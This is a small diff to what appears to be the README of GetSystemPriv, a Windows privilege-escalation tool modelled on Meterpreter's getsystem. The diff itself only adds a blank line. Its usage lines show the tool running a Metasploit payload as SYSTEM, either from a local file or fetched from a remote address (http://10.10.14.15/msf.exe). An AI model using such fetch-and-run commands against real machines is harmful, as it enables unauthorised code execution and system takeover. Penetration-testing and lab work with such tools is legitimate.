@@ -7,6 +7,7 @@ I'm a big fan of running *getsystem* while using Meterpreter and seeing SYSTEM c
 ## Usage
 Local file execution:
 `GetSystemPriv.exe local C:\Users\test\Desktop\msf.exe`
+
 Remote file execution:
 `GetSystemPriv.exe net http://10.10.14.15/msf.exe`
 
